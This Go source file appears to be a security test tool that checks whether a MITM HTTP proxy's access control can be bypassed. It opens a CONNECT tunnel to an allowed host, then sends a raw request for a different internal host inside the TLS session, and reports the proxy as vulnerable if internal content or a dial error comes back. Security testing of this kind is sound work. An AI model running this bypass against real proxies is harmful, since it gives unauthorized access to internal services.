package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"

	"oktopus/attack-and-tests/setup"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseRunFlags(args)
	if err != nil {
		return 2
	}
	return executeRun(o)
}

func executeRun(o runOpts) int {
	succeeded, err := runAttack(o)
	if err != nil {
		log.Printf("run: %v", err)
		return 1
	}
	if succeeded {
		return 1
	}
	return 0
}

// runAttack выполняет control + bypass; true = атака удалась (уязвимость).
func runAttack(o runOpts) (bool, error) {
	pool, err := loadCAForMode(o.caFile, o.connectMode)
	if err != nil {
		return false, err
	}

	if o.runControl {
		log.Println("=== control: прямой GET на internal через прокси (ожидаем deny) ===")
		runControlCheck(o.proxyAddr, o.internalURL, o.proxyUser, o.proxyPass)
	}

	log.Println("=== bypass: CONNECT allowed + HTTP на другой host ===")
	succeeded, err := runBypassAttack(o.connectMode, o.proxyAddr, o.connectHost, o.tlsSNI, o.mode, o.internalURL, o.internalHost, pool, o.proxyUser, o.proxyPass)
	if err != nil {
		return false, err
	}
	return succeeded, nil
}

func runControlCheck(proxyAddr, internalURL, user, pass string) {
	res, err := getAbsoluteURLViaProxy(proxyAddr, internalURL, user, pass)
	if err != nil {
		log.Printf("control: %v", err)
		return
	}
	defer res.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(res.Body, 4096))
	log.Printf("control: %s", setup.FormatPOCHTTPResponse(res.StatusCode, string(body)))
	if res.StatusCode == 200 && strings.Contains(string(body), "SECRET_INTERNAL_HIT") {
		log.Println("control: internal доступен напрямую — ужесточите ACL")
	}
}

func loadCAForMode(path, connectMode string) (*x509.CertPool, error) {
	if connectMode == "tunnel" {
		return x509.NewCertPool(), nil
	}
	return loadCA(path)
}

func runBypassAttack(connectMode, proxyAddr, connectDest, sni, mode, evilURL, evilHost string, pool *x509.CertPool, user, pass string) (bool, error) {
	raw, br, err := dialCONNECT(proxyAddr, connectDest, user, pass)
	if err != nil {
		return false, fmt.Errorf("CONNECT %s: %w", connectDest, err)
	}
	defer raw.Close()

	tlsCfg := &tls.Config{
		ServerName: sni,
		MinVersion: tls.VersionTLS12,
	}
	if connectMode == "tunnel" {
		tlsCfg.InsecureSkipVerify = true
	} else {
		tlsCfg.RootCAs = pool
	}
	tlsConn := tls.Client(&bufConn{Conn: raw, r: br}, tlsCfg)
	if err := tlsConn.Handshake(); err != nil {
		if connectMode == "tunnel" {
			log.Printf("bypass: TLS: %v (tunnel — MITM CA не ожидается)", err)
			return false, nil
		}
		return false, fmt.Errorf("TLS к MITM: %w", err)
	}

	var rawReq string
	switch mode {
	case "relative":
		rawReq = fmt.Sprintf("GET /secret HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", evilHost)
	case "absolute":
		rawReq = fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", evilURL, hostFromURL(evilURL))
	default:
		return false, fmt.Errorf("unknown -mode %q", mode)
	}
	if _, err := tlsConn.Write([]byte(rawReq)); err != nil {
		return false, err
	}

	resp, err := readHTTPResponse(tlsConn)
	if err != nil {
		return false, err
	}
	log.Printf("bypass: HTTP %d", resp.status)
	if snippet := setup.POCResponseSnippet(resp.status, resp.body); snippet != "" {
		log.Printf("bypass: ответ: %s", snippet)
	}
	switch bypassVerdict(resp, evilURL, evilHost) {
	case verdictConfirmedSecret:
		log.Println("bypass: ПОДТВЕРЖДЕНО — тело от internal origin")
		return true, nil
	case verdictConfirmedDial:
		log.Println("bypass: ПОДТВЕРЖДЕНО — ACL пропустил запрос, прокси сам подключился к internal host (502 = lab не слушает :9555)")
		return true, nil
	case verdictDenied:
		log.Println("bypass: отказ ACL (403/forbidden)")
	default:
		log.Println("bypass: атака не подтверждена")
	}
	return false, nil
}

type bypassVerdictKind int

const (
	verdictUnknown bypassVerdictKind = iota
	verdictConfirmedSecret
	verdictConfirmedDial
	verdictDenied
)

func bypassVerdict(resp httpResp, evilURL, evilHost string) bypassVerdictKind {
	body := resp.body
	if strings.Contains(body, "SECRET_INTERNAL_HIT") {
		return verdictConfirmedSecret
	}
	target := hostFromURL(evilURL)
	if target == "" {
		target = evilHost
	}
	if target != "" && strings.Contains(body, target) {
		if resp.status == 502 || strings.Contains(body, "dial tcp") || strings.Contains(body, "connectex") {
			return verdictConfirmedDial
		}
	}
	if resp.status == 403 || strings.Contains(body, "403 Forbidden") {
		return verdictDenied
	}
	return verdictUnknown
}

type httpResp struct {
	status int
	body   string
}

func readHTTPResponse(conn net.Conn) (httpResp, error) {
	br := bufio.NewReader(conn)
	statusLine, err := br.ReadString('\n')
	if err != nil {
		return httpResp{}, err
	}
	parts := strings.SplitN(strings.TrimSpace(statusLine), " ", 3)
	if len(parts) < 2 {
		return httpResp{}, fmt.Errorf("bad status: %q", statusLine)
	}
	code := 0
	fmt.Sscanf(parts[1], "%d", &code)

	var contentLen int
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			return httpResp{}, err
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			break
		}
		if strings.HasPrefix(strings.ToLower(line), "content-length:") {
			fmt.Sscanf(line, "Content-Length: %d", &contentLen)
		}
	}
	var body []byte
	if contentLen > 0 {
		body = make([]byte, contentLen)
		_, err = io.ReadFull(br, body)
	} else {
		body, err = io.ReadAll(br)
	}
	if err != nil && err != io.EOF {
		return httpResp{}, err
	}
	return httpResp{status: code, body: string(body)}, nil
}

func hostFromURL(u string) string {
	u = strings.TrimPrefix(u, "https://")
	u = strings.TrimPrefix(u, "http://")
	if i := strings.Index(u, "/"); i >= 0 {
		u = u[:i]
	}
	return u
}

func loadCA(path string) (*x509.CertPool, error) {
	pem, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(pem) {
		return nil, fmt.Errorf("no certificates in %s", path)
	}
	return pool, nil
}

type bufConn struct {
	net.Conn
	r *bufio.Reader
}

func (b *bufConn) Read(p []byte) (int, error) {
	return b.r.Read(p)
}
